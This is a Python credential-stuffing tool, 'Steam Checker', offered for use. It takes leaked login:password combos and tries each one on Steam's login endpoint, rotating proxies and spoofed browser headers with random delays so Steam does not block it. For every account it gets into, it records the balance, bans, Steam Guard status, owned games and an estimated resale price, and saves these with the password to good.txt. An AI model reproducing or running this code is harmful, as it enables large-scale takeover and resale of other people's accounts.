# Importing modules
import requests                                    
import rsa
import base64
import time
import random
import io
import certifi
import threading
from fake_headers import Headers
from bs4 import BeautifulSoup
from random import choice
from colorama import Fore, Back, Style
from colorama import init

# Setting up autoreset colorama styles
init(autoreset=True)

# Creating a design for script, that include TITLE, FLAG ART, TEXT FROM CREATOR and Processing information
Design_Title_Title = (Fore.CYAN + Style.BRIGHT + '\nSteam Checker 2023 by Fsocguy' + Fore.WHITE + Style.BRIGHT + '\n\nCreated specially for Titya01' + Fore.YELLOW + Style.BRIGHT + '\nVersion: ' + Fore.WHITE + Style.BRIGHT + '1.0' + Fore.YELLOW + Style.BRIGHT + '\nLast Update: ' + Fore.WHITE + Style.BRIGHT + '13.05.2023\n')
Design_Title_Text_1 = (Back.BLACK + Style.BRIGHT + '\n\n                    ' + Back.BLUE + '\n                    ' + Back.RED + '\n                    ' )
Design_Title_Text_2 = (Fore.WHITE + Style.BRIGHT + Back.BLACK + '\n\nMade with love from DPR!')
Design_Title_Output = Design_Title_Title + Design_Title_Text_1 + Design_Title_Text_2
print(Design_Title_Output)

# Creating a design for processing text
Processing_Title = (Fore.YELLOW + Style.BRIGHT + '\nStatus [READING]: ')
Processing_Text = (Fore.WHITE + Style.BRIGHT +'Checking accounts lines from combos.txt...')
Processing_Output = Processing_Title + Processing_Text
print(Processing_Output)

# Creating debug mode input
Debug_Mode_Title = (Fore.YELLOW + Style.BRIGHT + "Enable Debug mode? [yes/no]: " + Fore.WHITE + Style.BRIGHT)
Debug_Mode_Input = input(Debug_Mode_Title)
if Debug_Mode_Input == 'yes':
    Debug_Mode = True
    Debug_Mode_Enabled_Title = (Fore.YELLOW + Style.BRIGHT + 'Status [DEBUG MODE]: ')
    Debug_Mode_Enabled_Text = (Fore.WHITE + Style.BRIGHT + 'Enabled!')
    Debug_Mode_Enabled_Output = Debug_Mode_Enabled_Title + Debug_Mode_Enabled_Text
    print(Debug_Mode_Enabled_Output)
elif Debug_Mode_Input == 'no':
    Debug_Mode = False
    Debug_Mode_Disabled_Title = (Fore.YELLOW + Style.BRIGHT + 'Status [DEBUG MODE]: ')
    Debug_Mode_Disabled_Text = (Fore.WHITE + Style.BRIGHT + 'Disabled!')
    Debug_Mode_Disabled_Output = Debug_Mode_Disabled_Title + Debug_Mode_Disabled_Text
    print(Debug_Mode_Disabled_Output)
else:
    Debug_Mode_Unknown_Title = (Fore.YELLOW + Style.BRIGHT + 'Status [DEBUG MODE]: ')
    Debug_Mode_Unknown_Text = (Fore.WHITE + Style.BRIGHT + 'Wrong input, exiting.')
    Debug_Mode_Unknown_Output = Debug_Mode_Unknown_Title + Debug_Mode_Unknown_Text
    print(Debug_Mode_Unknown_Output)  
    exit()

# Creating main account checking function
def Account_Check(Login, Password):
    # Creating timeout between function call
    Timeout_Check = random.randint(5, 13)
    time.sleep(Timeout_Check)

    # Creating timeout for requests
    Timeout_RSA = random.randint(3, 5)
    Timeout_Login = random.randint(5, 10)
    Timeout_Login_Retry = random.randint(10, 15)
    Timeout_Account_Info = random.randint(2, 6)

    # Creating retries for null responce
    Max_Retries = 30

    # Genetaring headers for request
    headers = Headers(
        headers = True,
        browser = 'chrome',
        os = 'win'
    )
    Request_Header = headers.generate()
    Request_Retry = headers.generate()

    # Reading proxies from proxies.txt and creating string for random choosing proxy and random choosing proxy for retry request
    Proxies = []
    with open('PUT YOUR PATH TO proxies.txt', 'r') as f:
        for line in f:
            line = line.strip()
            if line.startswith('http://'):
                Proxies.append({'http': line})
            elif line.startswith('https://'):
                Proxies.append({'https': line})
            elif line.startswith('socks'):
                Proxies.append({'https': line, 'http': line})
        if not Proxies:
            # If proxy not found, raising error
            Proxy_Read_Error_Title = (Fore.RED + Style.BRIGHT + 'ERROR [PROXY]: ')
            Proxy_Read_Error_Text = (Fore.WHITE + Style.BRIGHT + 'No proxies found in the file.')
            Proxy_Read_Error_Output = Proxy_Read_Error_Title + Proxy_Read_Error_Text
            raise ValueError(Proxy_Read_Error_Text)
    Proxy = random.choice(Proxies)
    Proxy_Retry = random.choice(Proxies)

    # Printing the trying status info
    Account_Checking_Status_Title = (Fore.YELLOW + Style.BRIGHT + '\nStatus [CHECK]: ')
    Account_Checking_Status_Text = (Fore.WHITE + Style.BRIGHT + 'Trying to check account: ' + Fore.YELLOW + Style.BRIGHT + f'{Login};{Password} ' + Fore.WHITE + Style.BRIGHT + '...')
    Account_Checking_Status_Output = Account_Checking_Status_Title + Account_Checking_Status_Text
    print(Account_Checking_Status_Output)
    
    # Debug Mode for this RSA request
    if Debug_Mode == True:
        Account_Rsa_Key_Status_Debug_Title = (Fore.YELLOW + Style.BRIGHT + 'Status [CHECK / DEBUG]: ')
        Account_Rsa_Key_Status_Debug_Text = (Fore.WHITE + Style.BRIGHT + f'Using Proxy: ' + Fore.YELLOW + Style.BRIGHT + f'{Proxy} ' + Fore.WHITE + Style.BRIGHT + 'Using Header: ' + Fore.YELLOW + Style.BRIGHT + f'{Request_Header}')
        Account_Rsa_Key_Status_Debug_Output = Account_Rsa_Key_Status_Debug_Title + Account_Rsa_Key_Status_Debug_Text
        print(Account_Rsa_Key_Status_Debug_Output)
    
    # Sending request to get RSA key
    try:
        Session = requests.Session()
        rsa_key = Session.get(f'https://steamcommunity.com/login/getrsakey?username={Login}', headers=Request_Header, proxies=Proxy, timeout=Timeout_RSA, verify=certifi.where()).json()
        mod = int(rsa_key['publickey_mod'], 16)
        exp = int(rsa_key['publickey_exp'], 16)
        pub_key = rsa.PublicKey(mod, exp)
        password_encrypted = base64.b64encode(rsa.encrypt(Password.encode(), pub_key))
    except requests.exceptions.SSLError:
        SSLError_Title = (Fore.RED + Style.BRIGHT + 'ERROR [SSL]: ')
        SSLError_Text = (Fore.WHITE + Style.BRIGHT + 'Socks proxy caused Error, please use only http/https proxy!')
        SSLError_Output = SSLError_Title + SSLError_Text
        print(SSLError_Output)
 
    # Printing info about account login status
    Account_Login_Status_Title = (Fore.YELLOW + Style.BRIGHT + 'Status [LOGIN]: ')
    Account_Login_Status_Text = (Fore.WHITE + Style.BRIGHT + 'Logging into account: ' + Fore.YELLOW + Style.BRIGHT + f'{Login};{Password} ' + Fore.WHITE + Style.BRIGHT + '...')
    Account_Login_Status_Output = Account_Login_Status_Title + Account_Login_Status_Text
    print(Account_Login_Status_Output)

    # Debug Mode for this part of code
    if Debug_Mode == True:
        Account_Login_Status_Debug_Title = (Fore.YELLOW + Style.BRIGHT + 'Status [LOGIN / DEBUG]: ')
        Account_Login_Status_Debug_Text = (Fore.WHITE + Style.BRIGHT + 'Logging into account: ' + Fore.YELLOW + Style.BRIGHT + f'{Login};{Password} ' + Fore.WHITE + Style.BRIGHT + 'Using Proxy: ' + Fore.YELLOW + Style.BRIGHT + f'{Proxy} ' + Fore.WHITE + Style.BRIGHT + 'Using Header: ' + Fore.YELLOW + Style.BRIGHT + f'{Request_Header} ' + Fore.WHITE + Style.BRIGHT + '...')
        Account_Login_Status_Debug_Output = Account_Login_Status_Debug_Title + Account_Login_Status_Debug_Text
        print(Account_Login_Status_Debug_Output)

    # Sending request to login into account
    try:
        Session = requests.Session()
        Responce = Session.post('https://steamcommunity.com/login/dologin/', headers=Request_Header, proxies=Proxy, timeout=Timeout_Login, data={
            'username': Login,
            'password': password_encrypted,
            'rsatimestamp': rsa_key['timestamp'],
            'remember_login': False
            })
        json_data = Responce.json()
        Responce.raise_for_status()
    except requests.exceptions.HTTPError as Error:
        Http_Error_Title = (Fore.RED + Style.BRIGHT + 'ERROR [HTTP]: ')
        Http_Error_Text = (Fore.WHITE + Style.BRIGHT + f'{Error}')
        Http_Error_Output = Http_Error_Title + Http_Error_Text
        print(Http_Error_Output)

    # Debug Mode for this part of code
    if Debug_Mode == True:
        Json_Data_Debug_Title = (Fore.YELLOW + Style.BRIGHT + 'JSON Responce [DEBUG]: ')
        Json_Data_Debug_Text = (Fore.WHITE + Style.BRIGHT + f'{json_data}')
        Json_Data_Debug_Output = Json_Data_Debug_Title + Json_Data_Debug_Text
        print(Json_Data_Debug_Output)

    # If server responce returns none, retrying request in 60 seconds again
    if json_data == None:
        Json_Data_None_Title = (Fore.RED + Style.BRIGHT + 'ERROR [NULL]: ')
        Json_Data_None_Text = (Fore.WHITE + Style.BRIGHT + 'Steam blocked our requests. Trying to make new request in 60 seconds.')
        Json_Data_None_Output = Json_Data_None_Title + Json_Data_None_Text
        print(Json_Data_None_Output)

        # Retrying login request
        for i in range(Max_Retries):
            # Printing info about retrying request
            Account_Login_Status_Retry_Title = (Fore.YELLOW + Style.BRIGHT + 'Status [LOGIN / RETRYING]: ')
            Account_Login_Status_Retry_Text = (Fore.WHITE + Style.BRIGHT + 'Retrying to login...')
            Account_Login_Status_Retry_Output = Account_Login_Status_Retry_Title + Account_Login_Status_Retry_Text
            print(Account_Checking_Status_Output)
        
            # Sending request to login into account
            try:
                Session = requests.Session()
                Responce = Session.post('https://steamcommunity.com/login/dologin/', headers=Request_Retry, proxies=Proxy_Retry, timeout=Timeout_Login_Retry, data={
                'username': Login,
                'password': password_encrypted,
                'rsatimestamp': rsa_key['timestamp'],
                'remember_login': False
                })
                json_data = Responce.json()
                Responce.raise_for_status()
            except requests.exceptions.HTTPError as Error:
                Http_Error_Title = (Fore.RED + Style.BRIGHT + 'ERROR [HTTP]: ')
                Http_Error_Text = (Fore.WHITE + Style.BRIGHT + f'{Error}')
                Http_Error_Output = Http_Error_Title + Http_Error_Text
                print(Http_Error_Output)
        
             # If server responce is not none printing the user info about it
            if json_data is not None:
                Account_Login_Status_Retry_Success_Title = (Fore.YELLOW + Style.BRIGHT + 'Status [LOGIN / RETRYING]: ')
                Account_Login_Status_Retry_Success_Text = (Fore.GREEN + Style.BRIGHT + 'Success!')
                Account_Login_Status_Retry_Success_Output = Account_Login_Status_Retry_Success_Title + Account_Login_Status_Retry_Success_Text
                print(Account_Login_Status_Retry_Success_Output)

                # Debug Mode for this part of code
                if Debug_Mode == True:
                    Json_Data_Success_Debug_Title = (Fore.YELLOW + Style.BRIGHT + 'JSON Responce [RETRY / DEBUG]: ')
                    Json_Data_Success_Debug_Text = (Fore.WHITE + Style.BRIGHT + f'{json_data}')
                    Json_Data_Success_Debug_Output = Json_Data_Success_Debug_Title + Json_Data_Success_Debug_Text
                    print(Json_Data_Success_Debug_Output)
            
                # Exiting from loop
                break
        
            # Printing info about processing retry to user
            Account_Login_Status_Retry_Processing_Title = (Fore.YELLOW + Style.BRIGHT + 'Status [LOGIN / RETRYING]: ')
            Account_Login_Status_Retry_Processing_Text = (Fore.WHITE + Style.BRIGHT + 'Retrying request' + Fore.YELLOW + Style.BRIGHT + f' {i+1}/{Max_Retries} ' + Fore.WHITE + Style.BRIGHT + 'in 60 seconds...')
            Account_Login_Status_Retry_Processing_Output = Account_Login_Status_Retry_Processing_Title + Account_Login_Status_Retry_Processing_Text
            print(Account_Login_Status_Retry_Processing_Output)

            # Creating delay between retry request
            time.sleep(60)
    
        # If server still returns error, printing info to user
        else:
            Account_Login_Status_Retry_Error_Title = (Fore.YELLOW + Style.BRIGHT + 'Status [LOGIN / RETRYING]: ')
            Account_Login_Status_Retry_Error_Text = (Fore.RED + Style.BRIGHT + 'Server did not respond after max retries, try to restart programm.')
            Account_Login_Status_Retry_Error_Output = Account_Login_Status_Retry_Error_Title + Account_Login_Status_Retry_Error_Text
            print(Account_Login_Status_Retry_Error_Output)

    # Creating string for SteamLoginSecure cookie
    steam_login_secure = Session.cookies.get('steamLoginSecure')

    # Creating if\elif check for any responce
    if json_data.get('success') == True:
        # Creating strings about steamid and cookie for requests
        Steamid = json_data['transfer_parameters']['steamid']
        Cookie = {'steamLoginSecure': steam_login_secure}

        # Getting info about account balance with BeatifulSoup4
        def Get_Account_Balance(Cookie):
            try:
                Responce = requests.get('https://store.steampowered.com/account/store_transactions/', cookies=Cookie, headers=Request_Header, timeout=Timeout_Account_Info, proxies=Proxy)
                Soup = BeautifulSoup(Responce.text, 'lxml')
                Account_Balance_Find = Soup.find('div', class_='responsive_page_content')
                Account_Balance_Find_Value = Account_Balance_Find.find('div', class_='accountRow accountBalance')
                Account_Balance_Output = Account_Balance_Find_Value.find('a').text.strip()
                return Account_Balance_Output
            except AttributeError:
                try:
                    Account_Balance_Output = Account_Balance_Find_Value.find('div').text.strip()
                    return Account_Balance_Output
                except AttributeError:
                    return None
    
        # Getting info about account level with BeatifulSoup4
        def Get_Account_Level(Cookie, Steamid):
            try:
                Responce = requests.get(f'https://steamcommunity.com/profiles/{Steamid}', cookies=Cookie, headers=Request_Header, timeout=Timeout_Account_Info, proxies=Proxy)
                Soup = BeautifulSoup(Responce.text, 'lxml')
                Account_Level_Find = Soup.find('div', class_='profile_header_badgeinfo')
                Account_Level_Find_Value = Account_Level_Find.find('div', class_='persona_name persona_level')
                Account_Level_Output = Account_Level_Find_Value.find('span', class_='friendPlayerLevelNum').text.strip()
                return Account_Level_Output
            except AttributeError:
                return None

        # Getting info about account email verififcation with BeatifulSoup4
        def Get_Account_Email_Verification(Cookie):
            try:
                Responce = requests.get('https://store.steampowered.com/account/', cookies=Cookie, headers=Request_Header, timeout=Timeout_Account_Info, proxies=Proxy)
                Soup = BeautifulSoup(Responce.text, 'lxml')
                Account_Email_Verification = Soup.find('a', class_='account_data_field').text.strip()
                return Account_Email_Verification
            except AttributeError:
                return None

        # Getting info about account community ban with BeatifulSoup4
        def Get_Account_Community_Ban(Cookie, Steamid):
            try:
                Responce = requests.get(f'https://steamcommunity.com/profiles/{Steamid}', cookies=Cookie, headers=Request_Header, timeout=Timeout_Account_Info, proxies=Proxy)
                Soup = BeautifulSoup(Responce.text, 'lxml')
                Account_Community_Ban = Soup.find('div', class_='profile_ban_status ban_status_header')
                if Account_Community_Ban:
                    return True
                else:
                    return False
            except AttributeError:
                return False
        
        # Getting info about account vac ban
        def Get_Account_VAC_Ban(Cookie):
            try:
                Responce = requests.get('https://help.steampowered.com/en/wizard/VacBans', cookies=Cookie, headers=Request_Header, timeout=Timeout_Account_Info, proxies=Proxy)
                Soup = BeautifulSoup(Responce.text, 'lxml')
                Account_VAC_Ban_Find = Soup.find('div', class_='help_issue_details')
                Account_VAC_Ban = Account_VAC_Ban_Find.find('div', class_='vac_ban_header').text.strip()
                if Account_VAC_Ban == 'Bans applied by the Game Developer':
                    return True
                elif Account_VAC_Ban == None:
                    try:
                        Account_VAC_Ban = Account_VAC_Ban_Find('div', class_='no_vac_bans_header').text.strip()
                        if Account_VAC_Ban == 'Account In Good VAC Standing':
                            return False
                    except AttributeError:
                        return False
            except AttributeError:
                pass
            return False
        
        # Getting info about account limits
        def Get_Account_Limit(Cookie):
            try:
                Responce = requests.get('https://store.steampowered.com/account', cookies=Cookie, headers=Request_Header, timeout=Timeout_Account_Info, proxies=Proxy)
                Soup = BeautifulSoup(Responce.text, 'lxml')
                Account_Limit_Find = Soup.find('div', class_='account_security_block')
                Account_Limit = Account_Limit_Find.find('div', class_='account_data_field').text.strip()
                if 'Steam Guard is not enabled for this account' in Account_Limit:
                    return True
            except AttributeError:
                return None
            
        # Getting info about account games
        def Get_Account_Games(Cookie, Steamid):
            try:
                Responce = requests.get(f'https://steamid.pro/lookup/{Steamid}', cookies=Cookie, headers=Request_Header, timeout=Timeout_Account_Info, proxies=Proxy)
                Soup = BeautifulSoup(Responce.text, 'html.parser')
                GamesFind = Soup.find('table', class_='table game-table')
                Games = [td.text.strip() for td in GamesFind.find_all('td', class_='gname')]
                Games_time = [td.text.strip() for td in GamesFind.find_all('td', class_='gtime')]
                Games_list = ""
                for i, (game, time) in enumerate(zip(Games, Games_time)):
                    Games_list += f"[#{i+1}] - [Game: {game}] - [Played: {time}]\n"
                Games_count = len(Games)
            except AttributeError:
                try:
                    Responce = requests.get(f'https://store.steampowered.com/account/remotestorage', cookies=Cookie, headers=Request_Header, timeout=Timeout_Account_Info, proxies=Proxy)
                    Soup = BeautifulSoup(Responce.text, 'lxml')
                    table = Soup.find('table', {'class': 'accountTable'})
                    rows = table.find_all('tr')
                    games = []
                    for i, row in enumerate(rows[1:], 1):
                        cols = row.find_all('td')
                        game_name = cols[0].text.strip()
                        games.append(game_name)
                    Games_count = len(games)
                    Games_list = ""
                    for i, game in enumerate(games, 1):
                        Games_list += f"[#{i}] - [Game: {game}] - [Played: Bypass]\n"
                    Games = games
                    Games_time = 'Not Found'
                except AttributeError:
                    Games = 'Not Found'
                    Games_time = 'Not Found'
                    Games_list = 'Not Found'
                    Games_count = 'Not Found'
            return Games, Games_time, Games_list, Games_count

        # Getting info about account price
        def Get_Account_Price(Steamid):
            try:
                Responce = requests.get(f'https://steamid.pro/lookup/{Steamid}', headers=Request_Header, timeout=Timeout_Account_Info, proxies=Proxy)
                Soup = BeautifulSoup(Responce.text, 'html.parser')
                Account_Price = Soup.find('span', class_='number-price').text.strip()
                return Account_Price
            except AttributeError:
                return None

        # Calling functions of getting account info
        Account_Balance_Output = Get_Account_Balance(Cookie)
        Account_Level_Output = Get_Account_Level(Cookie, Steamid)
        Account_Email_Verification = Get_Account_Email_Verification(Cookie)
        Account_Community_Ban = Get_Account_Community_Ban(Cookie, Steamid)
        Account_VAC_Ban = Get_Account_VAC_Ban(Cookie)
        Account_Limit = Get_Account_Limit(Cookie)
        Games, Games_time, Games_list, Games_count = Get_Account_Games(Cookie, Steamid)
        Account_Price = Get_Account_Price(Steamid)

        # Printing all info and saving in good.txt
        Account_Valid_Output = (Fore.GREEN + Style.BRIGHT + f'\nAccount: {Login};{Password}\nStatus: Valid!\nURL: https://steamcommunity.com/profiles/{Steamid}\nBalance: {Account_Balance_Output}\nLevel: {Account_Level_Output}\nEMAIL: {Account_Email_Verification}\nKT: {Account_Community_Ban}\nVAC: {Account_VAC_Ban}\nLimit: {Account_Limit}\nAccount price: {Account_Price}\n<========================<Games: [{Games_count}]>========================>\n{Games_list}\n')
        print(Account_Valid_Output)
        with io.open('PUT YOUR PATH TO good.txt', 'a', encoding='utf-8') as f:
            Account_Valid_Output_Save = (f'Account: {Login};{Password}\nStatus: Valid!\nURL: https://steamcommunity.com/profiles/{Steamid}\nBalance: {Account_Balance_Output}\nLevel: {Account_Level_Output}\nEMAIL: {Account_Email_Verification}\nKT: {Account_Community_Ban}\nVAC: {Account_VAC_Ban}\nLimit: {Account_Limit}\nAccount price: {Account_Price}\n<========================<Games: [{Games_count}]>========================>\n{Games_list}\n')
            f.write(Account_Valid_Output_Save)
    
    elif json_data.get('emailauth_needed') == True:
        Email_Auth_Account_Output = (Fore.RED + Style.BRIGHT +  f'\nAccount: {Login};{Password}\nStatus: Email Auth\n')
        print(Email_Auth_Account_Output)
    elif json_data.get('requires_twofactor') == True:
        Two_Factor_Account_Output = (Fore.RED + Style.BRIGHT + f'\nAccount: {Login};{Password}\nStatus: Steam Guard\n')
        print(Two_Factor_Account_Output)
    elif json_data.get('message') == 'The account name or password that you have entered is incorrect.':
        Not_Valid_Account_Output = (Fore.RED + Style.BRIGHT + f'\nAccount: {Login};{Password}\nStatus: Not Valid\n')
        print(Not_Valid_Account_Output)
    elif json_data.get('message') == 'Please verify your humanity by re-entering the characters in the captcha.':
        Captcha_Account_Output = (Fore.RED + Style.BRIGHT + f'\nAccount: {Login};{Password}\nStatus: Captcha\n')
        print(Captcha_Account_Output)

# Creating function to read combo file and create threads
def process_combo_file(file_path, num_threads):
    # read in combos.txt
    with open(file_path, 'r') as file:
        lines = file.readlines()
    
    # divide logins and passwords between threads
    combos_per_thread = len(lines) // num_threads
    combos = [lines[i:i+combos_per_thread] for i in range(0, len(lines), combos_per_thread)]

    # create and start threads
    threads = []
    for i in range(num_threads):
        Thread_sleep = random.randint(4, 9)
        time.sleep(Thread_sleep)
        thread_combos = combos[i] if i < len(combos) else []
        t = threading.Thread(target=process_combos, args=(thread_combos,))
        threads.append(t)
        t.start()

    # wait for all threads to finish
    for t in threads:
        t.join()

# Creating function to read and process combo file
def process_combos(combos):
    for line in combos:
        try:
            Login, Password = line.strip().split(':')
        except ValueError:
            Combo_Error_Title = (Fore.RED + Style.BRIGHT + 'ERROR [COMBOS]: ')
            Combo_Error_Text = (Fore.WHITE + Style.BRIGHT + 'No combos found in the file!')
            Combo_Error_Output = Combo_Error_Title + Combo_Error_Text
            print(Combo_Error_Output)
            continue

        Account_Check(Login, Password)
        Timeout_Account_Check = random.randint(3, 13)
        time.sleep(Timeout_Account_Check)

# Getting threads list from user
if __name__ == '__main__':
    # get input from user of thread count
    num_threads = int(input(Fore.YELLOW + Style.BRIGHT + "Enter number of threads: "))

    # call process_combo_file function with file path and num_threads
    process_combo_file('PUT YOUR PATH TO combos.txt', num_threads)